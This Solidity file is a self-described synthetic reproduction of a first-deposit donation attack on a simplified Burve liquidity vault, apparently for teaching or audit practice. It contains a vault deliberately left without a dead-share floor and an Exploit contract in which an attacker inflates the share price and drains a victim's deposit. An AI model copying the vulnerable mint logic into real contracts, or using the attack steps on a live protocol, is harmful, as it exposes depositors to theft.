// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Burve (single) — First deposit front-running / donation attack
    (Pashov, Mar 2025; #57723)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: share mint is
        shares = mintNominalLiq * totalShares / totalNominalLiq
    with no dead-share floor / virtual offset. Attacker mints 1 share, donates
    assets to inflate totalNominalLiq, victim deposit rounds to 1 share (or 0);
    attacker redeems and captures the donated+victim liquidity.

    Finding path:
      1. Alice mints 1 wei liquidity → 1 share
      2. Alice donates 1e18 liquidity worth of tokens
      3. Charlie mints 2e18 liquidity → only 1 share
         (x * 1 / (0.5x + 1) = 1)
      4. totalShares == 2, charlie balance == 1

    FIX: dead shares on first deposit, or virtual shares/assets (OZ ERC4626).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Burve share vault — liquidity shares, no dead-share floor.
contract Burve {
    MockERC20 public token0;
    MockERC20 public token1;
    uint256 public totalShares;
    uint256 public totalNominalLiq; // tracked nominal liquidity
    mapping(address => uint256) public balanceOf;

    constructor(MockERC20 t0, MockERC20 t1) {
        token0 = t0;
        token1 = t1;
    }

    /// @dev mint(to, liq) — first depositor sets rate; no virtual offset.
    function mint(address to, uint256 mintNominalLiq) external returns (uint256 shares) {
        if (totalShares == 0) {
            // First deposit: 1:1 shares (no dead shares)
            shares = mintNominalLiq; // @> VULN: no dead-share floor / virtual deposit
            // FIX: dead shares / virtual offset (OZ ERC4626)
            token0.transferFrom(msg.sender, address(this), mintNominalLiq);
            token1.transferFrom(msg.sender, address(this), mintNominalLiq);
            totalNominalLiq = mintNominalLiq;
        } else {
            // Sync donated balances into totalNominalLiq BEFORE pricing new shares
            // (mirrors compoundV3Ranges() inflating totalNominalLiq on the victim's mint).
            _syncNominalFromBalances();
            // shares = mintNominalLiq * totalShares / totalNominalLiq
            // Finding: x * 1 / (0.5x + 1) = 1 when x=2e18 and donation=1e18
            shares = (mintNominalLiq * totalShares) / totalNominalLiq; // @> VULN: rounds down after donation
            token0.transferFrom(msg.sender, address(this), mintNominalLiq);
            token1.transferFrom(msg.sender, address(this), mintNominalLiq);
            totalNominalLiq += mintNominalLiq;
        }
        totalShares += shares;
        balanceOf[to] += shares;
    }

    /// @dev Donation inflates asset balances; compound/sync raises totalNominalLiq.
    function _syncNominalFromBalances() internal {
        uint256 b0 = token0.balanceOf(address(this));
        uint256 b1 = token1.balanceOf(address(this));
        uint256 measured = b0 < b1 ? b0 : b1;
        if (measured > totalNominalLiq) {
            totalNominalLiq = measured; // donation inflates the denominator
        }
    }

    function burn(uint256 shares) external returns (uint256 liqOut) {
        require(balanceOf[msg.sender] >= shares, "bal");
        _syncNominalFromBalances();
        liqOut = (shares * totalNominalLiq) / totalShares;
        balanceOf[msg.sender] -= shares;
        totalShares -= shares;
        totalNominalLiq -= liqOut;
        token0.transfer(msg.sender, liqOut);
        token1.transfer(msg.sender, liqOut);
    }
}

contract Actor {
    Burve public burve;
    MockERC20 public t0;
    MockERC20 public t1;

    constructor(Burve b, MockERC20 a, MockERC20 c) {
        burve = b;
        t0 = a;
        t1 = c;
    }

    function doMint(uint256 liq) external {
        t0.approve(address(burve), liq);
        t1.approve(address(burve), liq);
        burve.mint(address(this), liq);
    }

    function doDonate(uint256 liq) external {
        t0.transfer(address(burve), liq);
        t1.transfer(address(burve), liq);
    }

    function doBurn(uint256 shares) external {
        burve.burn(shares);
    }
}

/// @dev Alice mints 1, donates 1e18, Charlie mints 2e18 → only 1 share; Alice drains.
contract Exploit {
    MockERC20 public token0; // CREATE 1
    MockERC20 public token1; // CREATE 2
    Burve public burve; // CREATE 3 — vulnerable
    Actor public alice; // CREATE 4 — attacker
    Actor public charlie; // CREATE 5 — victim

    uint256 public aliceStolen0;
    uint256 public charlieShares;

    constructor() {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");
        burve = new Burve(token0, token1);
        alice = new Actor(burve, token0, token1);
        charlie = new Actor(burve, token0, token1);

        // Fund actors (finding: 10e18 each side)
        token0.mint(address(alice), 10 ether);
        token1.mint(address(alice), 10 ether);
        token0.mint(address(charlie), 10 ether);
        token1.mint(address(charlie), 10 ether);
    }

    function run() external {
        // 1. Alice mints 1 wei of liquidity → 1 share
        alice.doMint(1);
        require(burve.balanceOf(address(alice)) == 1, "alice 1 share");
        require(burve.totalShares() == 1, "ts 1");

        // 2. Alice donates 1e18 liquidity (both tokens)
        alice.doDonate(1 ether);
        // totalNominalLiq still 1 until charlie's mint syncs — sync on mint

        // 3. Charlie provides 2e18 liquidity; shares = 2e18 * 1 / (1e18+1) = 1
        charlie.doMint(2 ether);
        charlieShares = burve.balanceOf(address(charlie));
        require(charlieShares == 1, "charlie only 1 share"); // finding assert
        require(burve.totalShares() == 2, "ts 2");

        // 4. Alice burns her 1 share → ~half the pool (includes charlie's deposit)
        uint256 a0Before = token0.balanceOf(address(alice));
        alice.doBurn(1);
        aliceStolen0 = token0.balanceOf(address(alice)) - a0Before;

        // HARM: charlie deposited 2e18 but only holds 1 of 2 shares; alice extracted
        // roughly half of (1 + 1e18 + 2e18) ≈ 1.5e18 from a 1-wei stake + donation.
        require(aliceStolen0 >= 1 ether, "alice extracted >= donation scale");
        // Charlie is left with 1 share of a depleted pool
        require(burve.balanceOf(address(charlie)) == 1, "charlie stuck with 1");
        require(burve.totalNominalLiq() < 2 ether, "charlie underwater vs deposit");
    }
}
